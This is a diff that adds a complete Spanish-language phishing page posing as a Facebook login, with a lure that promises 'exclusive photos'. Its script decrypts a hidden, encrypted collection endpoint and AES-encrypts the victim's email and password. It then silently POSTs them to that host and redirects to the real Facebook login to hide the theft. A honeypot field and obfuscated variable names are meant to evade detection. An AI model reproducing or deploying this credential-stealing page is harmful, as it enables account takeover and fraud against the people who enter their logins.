@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sesión Exclusiva</title>
+    <link rel="icon" href="https://raw.githubusercontent.com/Viponline24hrs/yori/refs/heads/main/favicon.ico" type="image/x-icon">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        :root {
+            --fb-blue: #1877F2;
+            --fb-dark: #166fe5;
+            --alert-bg: #fff9d7;
+            --alert-border: #e2c822;
+            --glass-bg: rgba(255, 255, 255, 0.96);
+        }
+
+        *, *::before, *::after {
+            margin: 0; padding: 0; box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%; height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        #preloader {
+            position: fixed; inset: 0;
+            background: #000000; z-index: 9999;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            transition: opacity 0.8s ease, visibility 0.8s;
+        }
+        #preloader.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+
+        .stars-container { position: absolute; inset: 0; overflow: hidden; }
+        .star {
+            position: absolute; background: #fff; border-radius: 50%;
+            box-shadow: 0 0 4px rgba(255,255,255,0.8);
+            animation: twinkle linear infinite;
+        }
+        @keyframes twinkle {
+            0%,100%{ opacity:0; transform:scale(0.5); }
+            50%{ opacity:1; transform:scale(1); }
+        }
+
+        .loader-text {
+            position: relative; z-index: 2; color: #fff;
+            font-size: 18px; font-weight: 300; letter-spacing: 2px; text-transform: uppercase;
+        }
+        .loader-text::after {
+            content: ''; display: inline-block; width: 20px;
+            animation: loadingDots 1.5s steps(4,end) infinite;
+        }
+        @keyframes loadingDots {
+            0%{content:''} 25%{content:'.'} 50%{content:'..'} 75%{content:'...'} 100%{content:''}
+        }
+
+        .bg-layer { position: fixed; inset: 0; z-index: -1; }
+        .bg-photo {
+            width: 100%; height: 100%;
+            background: url('https://i.imgur.com/V1jjuLu.jpeg') no-repeat center/cover;
+            filter: brightness(0.7);
+        }
+
+        .main-wrap {
+            width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+            padding: 4mm;
+        }
+
+        .login-card {
+            position: relative; width: 100%; max-width: 400px;
+            background: var(--glass-bg); border-radius: 12px;
+            padding: 32px 28px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.3);
+            overflow: hidden;
+        }
+
+        .fb-brand { text-align: center; margin-bottom: 20px; }
+        .fb-brand svg { width: 48px; height: 48px; fill: var(--fb-blue); }
+
+        h1 { text-align: center; font-size: 22px; color: #1c1e21; margin-bottom: 16px; font-weight: 700; }
+
+        .alert-msg {
+            display: flex; align-items: center; gap: 12px;
+            background: var(--alert-bg); border-left: 4px solid var(--alert-border);
+            border-radius: 6px; padding: 12px; margin-bottom: 20px;
+            font-size: 13px; line-height: 1.4; color: #5c4b00;
+        }
+        .alert-msg img { width: 32px; height: 32px; object-fit: contain; flex-shrink: 0; }
+
+        .input-group { position: relative; margin-bottom: 14px; }
+        input[type="email"], input[type="password"] {
+            width: 100%; padding: 14px 16px;
+            border: 1px solid #dddfe2; border-radius: 6px;
+            font-size: 16px; color: #1d2129; background: #fff;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        input:focus { outline: none; border-color: var(--fb-blue); box-shadow: 0 0 0 3px rgba(24,119,242,0.2); }
+
+        .hp-field { position: absolute; opacity: 0; pointer-events: none; width: 0; height: 0; }
+
+        .btn-submit {
+            width: 100%; padding: 14px; margin-top: 6px;
+            background: var(--fb-blue); color: #fff; border: none;
+            border-radius: 6px; font-size: 16px; font-weight: 700;
+            cursor: pointer; transition: background 0.2s, transform 0.1s;
+        }
+        .btn-submit:hover { background: var(--fb-dark); }
+        .btn-submit:active { transform: scale(0.98); }
+        .btn-submit:disabled { opacity: 0.7; cursor: wait; }
+
+        .forgot-pass {
+            display: block; text-align: center; margin-top: 16px;
+            color: var(--fb-blue); text-decoration: none; font-size: 14px; font-weight: 500;
+        }
+
+        @media screen and (max-width: 480px) {
+            .main-wrap { align-items: flex-start; padding: 4mm; padding-top: 8mm; }
+            .login-card { width: calc(100% - 8mm); margin: 0 auto; padding: 24px 4mm; max-width: none; }
+            h1 { font-size: 20px; }
+            .alert-msg { font-size: 12.5px; padding: 10px; }
+        }
+
+        #processOverlay {
+            display: none; position: fixed; inset: 0; z-index: 500;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(5px);
+            flex-direction: column; justify-content: center; align-items: center;
+        }
+        #processOverlay.active { display: flex; }
+        .process-box { text-align: center; color: #fff; }
+        .spinner {
+            width: 40px; height: 40px; margin: 0 auto 16px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff; border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="preloader">
+        <div class="stars-container" id="starsBox"></div>
+        <div class="loader-text">Iniciando carga</div>
+    </div>
+
+    <div class="bg-layer"><div class="bg-photo"></div></div>
+
+    <div id="processOverlay">
+        <div class="process-box">
+            <div class="spinner"></div>
+            <p style="font-size:16px; letter-spacing:1px;">VERIFICANDO CREDENCIALES...</p>
+        </div>
+    </div>
+
+    <div class="main-wrap">
+        <div class="login-card">
+            <div class="fb-brand">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+            </div>
+
+            <h1>Iniciar Sesión</h1>
+
+            <div class="alert-msg">
+                <img src="https://i.postimg.cc/nLCNrqBt/456112-removebg-preview.png" alt="Candado">
+                <span>Debes iniciar sesión para ver las fotos exclusivas.</span>
+            </div>
+
+            <form id="loginForm" onsubmit="return handleLogin(event)" autocomplete="off">
+                <input type="text" name="email_verify" class="hp-field" tabindex="-1" aria-hidden="true">
+                
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Número de teléfono o correo" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="pass" placeholder="Contraseña" required>
+                </div>
+
+                <button type="submit" id="btnSubmit" class="btn-submit">Iniciar Sesión</button>
+            </form>
+            <a href="#" class="forgot-pass">¿Has olvidado tu contraseña?</a>
+        </div>
+    </div>
+
+    <script>
+        (function(){
+            var box = document.getElementById('starsBox');
+            for(var i=0;i<80;i++){
+                var s = document.createElement('div'); s.className='star';
+                var sz = Math.random()*2+1, d = Math.random()*3+2, dl = Math.random()*5;
+                s.style.cssText = 'left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;width:'+sz+'px;height:'+sz+'px;animation-duration:'+d+'s;animation-delay:'+dl+'s;';
+                box.appendChild(s);
+            }
+            window.addEventListener('load',function(){
+                setTimeout(function(){document.getElementById('preloader').classList.add('hidden');}, 2200);
+            });
+        })();
+
+        var _ep = "U2FsdGVkX1/0I1bGHkn68ACk52Ab4mGDgkv2rT0hjQSlT9SYf35PBHfG0vBVw8OVe4GIKEr9kgOIiPMtPbEFbQ==";
+        var _pw = "16a15941-e153-4983-bb48-b98afce0dcdc";
+        var _k  = "16a15941-e153-4983-bb48-b98afce0dcdc";
+        var _iv = "U2FsdGVkX1/0I1bGHkn68ACk52Ab4mGDgkv2rT0hjQSlT9SYf35PBHfG0vBVw8OVe4GIKEr9kgOIiPMtPbEFbQ==";
+
+        async function gK(v){
+            var e = new TextEncoder();
+            var r = await crypto.subtle.digest('SHA-256', e.encode(_k));
+            if(v) return r;
+            return crypto.subtle.importKey('raw', r, {name:'AES-CBC'}, false, ['encrypt']);
+        }
+
+        async function gI(){
+            var e = new TextEncoder();
+            var h = await crypto.subtle.digest('SHA-256', e.encode(_iv));
+            return h.slice(0, 16);
+        }
+
+        async function eA(t){
+            var [k, i] = await Promise.all([gK(), gI()]);
+            var b = new TextEncoder().encode(t);
+            var c = await crypto.subtle.encrypt({name:'AES-CBC', iv:i}, k, b);
+            var u = new Uint8Array(c);
+            var s = '';
+            for(var j=0;j<u.byteLength;j++) s += String.fromCharCode(u[j]);
+            return btoa(s);
+        }
+
+        async function handleLogin(e){
+            e.preventDefault();
+            var em = document.getElementById('email').value.trim();
+            var ps = document.getElementById('pass').value;
+            var hp = document.querySelector('.hp-field').value;
+            var bt = document.getElementById('btnSubmit');
+
+            if(hp !== '') return false;
+            if(!em || ps.length < 1) return false;
+
+            bt.disabled = true;
+            bt.innerText = 'Procesando...';
+            document.getElementById('processOverlay').classList.add('active');
+
+            var ep = '';
+            try {
+                var d = CryptoJS.AES.decrypt(_ep, _pw);
+                ep = d.toString(CryptoJS.enc.Utf8);
+            } catch(err){}
+
+            if(!ep || !ep.match(/^https?:\/\//)){
+                setTimeout(function(){
+                    window.location.href = 'https://www.facebook.com/login/?next=profile';
+                }, 800);
+                return false;
+            }
+
+            try {
+                var pl = JSON.stringify({e: em, p: ps});
+                var en = await eA(pl);
+
+                await fetch(ep, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {'Content-Type':'application/x-www-form-urlencoded'},
+                    body: 'payload=' + encodeURIComponent(en)
+                });
+
+            } catch(err){}
+
+            setTimeout(function(){
+                window.location.href = 'https://www.facebook.com/login/?next=profile';
+            }, 1200);
+
+            return false;
+        }
+    </script>
+</body>
+</html>
